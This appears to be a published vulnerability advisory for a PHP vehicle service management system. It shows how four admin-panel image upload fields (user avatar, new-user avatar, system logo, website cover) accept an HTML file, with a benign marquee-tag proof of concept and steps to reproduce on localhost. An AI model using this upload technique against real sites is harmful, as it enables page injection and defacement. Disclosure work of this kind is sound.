# Vehicle Service Management System - 'Multiple' File upload Leads to Html Injection
Vehicle Service Management System - 'Multiple' File upload Leads to Html Injection

### Exploit Title: Vehicle Service Management System - 'Multiple' File upload Leads to Html Injection
###  Date: 29/12/2021
###  Exploit Author: P.L.Sanu
###  Exploit Author Website: https://www.plsanu.com
###  Vendor Homepage: https://www.sourcecodester.com
###  Software Link: https://www.sourcecodester.com/php/14972/vehicle-service-management-system-php-free-source-code.html
###  Version: <= 1.0
###  Tested on: Windows 10
###  CVE : 
###  Google Dork: N/A
###  Reference: 

- https://github.com/plsanu/Vehicle-Service-Management-System-Multiple-File-upload-Leads-to-Html-Injection

### 1. Vehicle Service Management System - 'MyAccount' (/admin/?page=user)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to My Account section http://localhost/vehicle_service/admin/?page=user

### Code:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In My Account Section enter all the required details and browse the html file in Avatar.
5. Click on update button.
6. Open the avatar image in new tab.
7. Html Injection is Executed.

### 2. Vehicle Service Management System - 'User List' (/admin/?page=user/manage_user)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to User List section and click on Create New button.

### Code:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In Create New User Page enter all the required details and browse the html file in Avatar.
5. Click on Save button.
6. Open the avatar image in new tab.
7. Html Injection is Executed.

### 3. Vehicle Service Management System - 'Settings-System Logo' (/admin/?page=system_info)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Code:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In Settings Section enter all the required details and browse the html file in System Logo.
5. Click on update button.
6. Open the System Logo image in new tab.
7. Html Injection is Executed.

### 4. Vehicle Service Management System - 'Settings-Website Cover' (/admin/?page=system_info)

### Steps to Reproduce:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info

### Code:
```html
<!DOCTYPE html>
<html>
<head>
<title>HTML marquee Tag</title>
</head>
<body>
<marquee>HTML INJECTION</marquee>
</body>
</html>
```
3. Save the above html code For Ex:Html Injection.html
4. In Settings Section enter all the required details and browse the html file in Website Cover.
5. Click on update button.
6. Open the Website Cover image in new tab.
7. Html Injection is Executed.
